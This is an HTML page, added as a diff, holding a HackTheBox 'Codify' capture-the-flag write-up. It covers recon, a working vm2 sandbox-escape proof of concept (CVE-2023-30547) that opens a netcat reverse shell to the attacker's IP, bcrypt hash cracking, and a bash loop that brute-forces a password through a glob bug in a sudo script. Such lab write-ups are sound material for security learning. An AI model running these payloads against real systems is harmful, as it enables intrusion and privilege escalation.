@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <link rel="canonical" href="https://ribeir.in/writeups/htb/codify.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="/favicon.ico" sizes="any">
+    <link rel="apple-touch-icon" href="/images/gaules_anao.jpeg">
+    <title>[HTB] Codify - ribeir.in</title>
+    <link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+    <div class="container">
+        <div data-component="header" data-base-path="../../"></div>
+
+        <main>
+            <article class="content">
+                <a class="back-link" href="../hackthebox.html">← hackthebox</a>
+
+                <div class="article-head">
+                    <span class="badge badge-htb">HTB</span>
+                    <span class="diff diff-easy">easy</span>
+                    <span class="article-cat">· linux / web</span>
+                </div>
+
+                <h1>Codify</h1>
+
+                <div class="info-grid">
+                    <div class="info-cell"><span class="info-label">platform</span><span class="info-val">HackTheBox</span></div>
+                    <div class="info-cell"><span class="info-label">machine</span><span class="info-val">Codify</span></div>
+                    <div class="info-cell"><span class="info-label">category</span><span class="info-val">Web</span></div>
+                    <div class="info-cell"><span class="info-label">os</span><span class="info-val">Linux</span></div>
+                </div>
+
+                <div class="tags">
+                    <span class="tag">vm2 3.9.16 sandbox escape (cve-2023-30547)</span>
+                    <span class="tag">nodejs editor rce</span>
+                    <span class="tag">sqlite bcrypt crack</span>
+                    <span class="tag">bash glob password bruteforce</span>
+                    <span class="tag">sudo script privesc</span>
+                </div>
+
+                <img src="../../images/hackthebox/codify/index.png" alt="Codify Machine" style="max-width: 100%; margin-bottom: 20px;">
+
+                <h2>Recon</h2>
+
+                <p>Starting with <code>nmap</code>. SSH on 22, Apache on 80, and a Node.js Express app on 3000. I trimmed the long list of filtered ports.</p>
+
+                <pre><code>[Codify] nmap -Pn -Pn --min-rate 2000 -T5 -oN nmap -sSVC codify.htb
+Nmap scan report for codify.htb (10.129.25.24)
+Host is up (0.26s latency).
+PORT      STATE    SERVICE       VERSION
+22/tcp    open     ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http          Apache httpd 2.4.52
+|_http-title: Codify
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+3000/tcp  open     http          Node.js Express framework
+|_http-title: Codify
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre>
+
+                <p>Both web ports serve the same app, "Codify", an online playground that lets you write and run Node.js snippets in a sandbox. After adding <code>codify.htb</code> to <code>/etc/hosts</code>, the <code>/about</code> page spells out exactly how the sandbox is built: it runs untrusted code inside <strong>vm2 3.9.16</strong>.</p>
+
+                <pre><code>http://codify.htb/about
+vm2 3.9.16</code></pre>
+
+                <h2>Exploitation</h2>
+
+                <p>vm2 is a Node.js library meant to run untrusted JavaScript in an isolated context, and version 3.9.16 is vulnerable to <a href="https://www.cve.org/CVERecord?id=CVE-2023-30547">CVE-2023-30547</a>, a sandbox escape. vm2 failed to sanitise exceptions raised by the host while the sandbox was running, so a crafted object thrown from inside the sandbox leaks a reference to a <em>host</em> object. From that host object you can walk <code>constructor.constructor</code> back to the real <code>Function</code> constructor, and from there reach <code>process</code> and <code>require('child_process')</code>, which is a full break out of the sandbox into arbitrary command execution on the box.</p>
+
+                <p>leesh3288's public PoC (<a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">gist 381b230b</a>) triggers this with a <code>Proxy</code> whose <code>getPrototypeOf</code> trap recurses until the host throws, then catches the leaked host error and pivots through its constructor. I dropped the command execution into the <code>catch</code> block so it fires a reverse shell, and pasted the whole thing into the <code>/editor</code> textarea to run it:</p>
+
+                <pre><code>const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+err = {};
+const handler = {
+    getPrototypeOf(target) {
+        (function stack() {
+            new Error().stack;
+            stack();
+        })();
+    }
+};
+
+const proxiedErr = new Proxy(err, handler);
+try {
+    throw proxiedErr;
+} catch ({constructor: c}) {
+    c.constructor('return process')().mainModule.require('child_process').execSync('busybox nc 10.10.15.221 4444 -e /bin/bash');
+}
+`
+
+console.log(vm.run(code));</code></pre>
+
+                <p>Start a listener, submit the snippet, and the escape lands a shell as the low-privileged account running the editor service.</p>
+
+                <pre><code>[Codify] nc -lvnp 4444
+Connection received on 10.129.25.24
+$ id</code></pre>
+
+                <h2>Post Exploitation</h2>
+
+                <p>Local enumeration turns up a SQLite database belonging to the contact app under <code>/var/www/contact</code>. Its <code>users</code> table holds a single bcrypt hash for <code>joshua</code>:</p>
+
+                <pre><code>$ sqlite3 /var/www/contact/tickets.db 'select username,password from users'
+joshua|$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</code></pre>
+
+                <p>That is a bcrypt hash (mode 3200), so I fed it to hashcat with rockyou. It falls in about half a minute:</p>
+
+                <pre><code>[Codify] hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
+$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</code></pre>
+
+                <p><code>joshua</code> is a real user on the box and the password is reused for his system account, so it is a straight <code>su</code> to the user flag:</p>
+
+                <pre><code>$ su joshua
+Password: spongebob1
+joshua@codify:~$ cat ~/user.txt</code></pre>
+
+                <h2>Privilege Escalation</h2>
+
+                <p>Checking <code>sudo</code> rights, <code>joshua</code> can run one backup script as root:</p>
+
+                <pre><code>joshua@codify:~$ sudo -l
+Matching Defaults entries for joshua on codify:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User joshua may run the following commands on codify:
+    (root) /opt/scripts/mysql-backup.sh</code></pre>
+
+                <p>The script prompts for the MySQL password and compares it to the real one before running the backup. The comparison is the bug:</p>
+
+                <pre><code>if [[ $DB_PASS == $USER_PASS ]]; then</code></pre>
+
+                <p>Inside a bash <code>[[ ]]</code> test, an unquoted right-hand side is treated as a glob pattern, not a literal string. So <code>$USER_PASS</code> is matched against <code>$DB_PASS</code> as a pattern: entering <code>*</code> matches any password, and more usefully, entering <code>a*</code>, <code>b*</code>, and so on tells you whether the real password starts with that character. That turns the check into a character-by-character oracle. This small loop brute-forces the password one character at a time, watching for the script's success message:</p>
+
+                <pre><code>root@codify:/tmp# cat test.sh
+#!/bin/bash
+password=""
+while true; do
+    for char in {a..z} {A..Z} {0..9}; do
+        test_pass="${password}${char}*"
+        if echo "$test_pass" | sudo /opt/scripts/mysql-backup.sh 2&gt;/dev/null | grep -q "confirmed"; then
+            password="${password}${char}"
+            echo "Found: $password"
+            break
+        fi
+    done
+done</code></pre>
+
+                <p>The recovered password is also root's password, so once the loop prints the full string it is just a <code>su</code> to root and <code>/root/root.txt</code>.</p>
+
+                <pre><code>joshua@codify:~$ su root
+Password:
+root@codify:/home/joshua# id
+uid=0(root) gid=0(root) groups=0(root)
+root@codify:/home/joshua# cat /root/root.txt</code></pre>
+
+                <p>The MySQL instance itself runs in a container with <code>FILE</code>/<code>load_file</code> privileges, which looks like a UDF privilege escalation waiting to happen (<code>raptor_udf2</code>), but that is a rabbit hole here. The glob comparison in the sudo script is the intended path.</p>
+
+                <div class="article-eof">
+                    <div class="eof-line">─────────────────────────────────────</div>
+                    <div class="eof-title">HackTheBox // Codify</div>
+                    <div class="eof-author">ribeir.in</div>
+                    <div class="eof-line">─────────────────────────────────────</div>
+                </div>
+            </article>
+
+        </main>
+
+        <div data-component="footer" data-base-path="../../"></div>
+    </div>
+
+    <script src="../../js/main.js"></script>
+</body>
+</html>
